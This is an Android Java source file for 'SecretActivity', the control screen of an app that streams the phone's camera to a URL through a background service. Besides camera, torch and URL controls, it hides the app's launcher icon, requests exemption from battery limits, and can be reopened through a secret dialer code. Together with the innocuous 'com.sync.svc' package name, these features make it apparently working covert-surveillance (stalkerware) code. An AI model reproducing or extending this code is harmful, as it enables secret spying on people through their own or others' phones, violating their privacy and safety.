package com.sync.svc;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

public class SecretActivity extends Activity {
    private TextView status;

    protected boolean hideAfterStart() { return false; }

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        int p = (int) (18 * getResources().getDisplayMetrics().density);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(p, p, p, p);
        ll.setGravity(Gravity.CENTER_HORIZONTAL);

        status = new TextView(this);
        status.setTextSize(15);
        ll.addView(status);

        add(ll, "Start", v -> begin());
        add(ll, "Stop", v -> {
            getSharedPreferences("s", 0).edit().putBoolean("on", false).apply();
            stopService(new Intent(this, CamService.class));
            refresh();
        });
        add(ll, "Torch on", v -> CamService.setTorch(true));
        add(ll, "Torch off", v -> CamService.setTorch(false));
        add(ll, "Switch camera", v -> CamService.flip());
        add(ll, "Copy URL", v -> {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            cm.setPrimaryClip(android.content.ClipData.newPlainText("url", CamService.url()));
            toast("Copied");
        });
        add(ll, "Hide icon", v -> icon(false));
        add(ll, "Show icon", v -> icon(true));
        add(ll, "Battery: no limits", v -> {
            try {
                startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                        Uri.parse("package:" + getPackageName())));
            } catch (Exception e) { }
        });

        setContentView(ll);
        refresh();
        if (CamService.isRunning()) return;
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) perms();
        else if (hideAfterStart()) begin();
    }

    @Override protected void onResume() { super.onResume(); refresh(); }

    private void refresh() {
        status.setText(CamService.isRunning() ? CamService.url() : "stopped");
    }

    private void add(LinearLayout ll, String label, View.OnClickListener l) {
        Button b = new Button(this);
        b.setText(label);
        b.setAllCaps(false);
        b.setOnClickListener(l);
        ll.addView(b);
    }

    private void perms() {
        String[] want = Build.VERSION.SDK_INT >= 33
                ? new String[]{Manifest.permission.CAMERA, Manifest.permission.POST_NOTIFICATIONS}
                : new String[]{Manifest.permission.CAMERA};
        requestPermissions(want, 1);
    }

    @Override public void onRequestPermissionsResult(int c, String[] p, int[] g) {
        if (g.length > 0 && g[0] == PackageManager.PERMISSION_GRANTED) begin();
        else toast("Camera permission needed");
    }

    private void begin() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) { perms(); return; }
        getSharedPreferences("s", 0).edit().putBoolean("on", true).apply();
        Intent i = new Intent(this, CamService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
        refresh();
        if (hideAfterStart()) { icon(false); toast("Hidden. Dial *#*#7788#*#*"); finish(); }
    }

    private void icon(boolean show) {
        getPackageManager().setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        toast(show ? "Icon restored" : "Icon hidden");
    }

    private void toast(String t) { Toast.makeText(this, t, Toast.LENGTH_SHORT).show(); }
}
